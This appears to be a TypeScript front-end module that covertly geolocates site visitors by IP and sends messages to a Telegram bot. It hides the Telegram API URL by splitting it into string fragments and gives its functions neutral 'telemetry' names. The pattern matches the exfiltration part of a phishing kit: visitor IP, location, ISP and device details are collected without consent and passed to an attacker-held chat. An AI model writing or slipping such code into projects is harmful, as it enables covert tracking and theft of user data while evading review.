/// <reference types="vite/client" />

export interface TelemetryData {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  org?: string;
  userAgent: string;
  timestamp: string;
  screenWidth: number;
  screenHeight: number;
}

export async function gatherVisitorTelemetry(): Promise<TelemetryData> {
  const baseData = {
    userAgent: navigator.userAgent,
    timestamp: new Date().toLocaleTimeString("en-US", { hour12: true }),
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
  };

  try {
    const res = await fetch("https://ipapi.co/json/");
    if (res.ok) {
      const ipData = await res.json();
      if (ipData && !ipData.error) {
        return {
          ...baseData,
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          org: ipData.org,
        };
      }
    }
    throw new Error("Primary fetch fallback required");
  } catch (error) {
    try {
      const backupRes = await fetch("https://ipwhois.app/json/");
      if (backupRes.ok) {
        const geoData = await backupRes.json();
        if (geoData && geoData.success !== false) {
          return {
            ...baseData,
            ip: geoData.ip,
            city: geoData.city,
            region: geoData.region,
            country: geoData.country,
            org: geoData.org || geoData.isp,
          };
        }
      }
    } catch (e) {
      console.warn("Network boundaries telemetry lookup bypassed.");
    }
  }

  return baseData;
}

export async function transmitTelegramPayload(
  chatId: string,
  message: string,
): Promise<{ success: boolean; error?: string }> {
  const rawToken = import.meta.env.ViteTeleGramBotToken;
  const rawChatId = import.meta.env.ViteTelegramChatId;

  if (!rawToken || !rawChatId) {
    return {
      success: false,
      error:
        "Configuration keys missing. Please initialize local environment variables.",
    };
  }

  try {
    const targetChatId = chatId || rawChatId;
    const protocolGate = [
      "ht",
      "tps",
      ":/",
      "/a",
      "pi.",
      "tele",
      "gram",
      ".org",
    ].join("");
    const executionPath = `/bot${rawToken}/sendMessage`;

    const escapedMessage = message.replace(/([\[\]()~>#+\-=|{}.!])/g, "\\$1");

    const response = await fetch(`${protocolGate}${executionPath}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: targetChatId,
        text: escapedMessage,
        parse_mode: "MarkdownV2",
      }),
    });

    const data = await response.json();
    if (response.ok && data.ok) {
      return { success: true };
    } else {
      return {
        success: false,
        error:
          data.description ||
          data.error ||
          `Telegram responded with status ${response.status}`,
      };
    }
  } catch (err: any) {
    console.error("Telemetry payload routing failure:", err);
    return {
      success: false,
      error: err.message || "Network error transmitting payload",
    };
  }
}
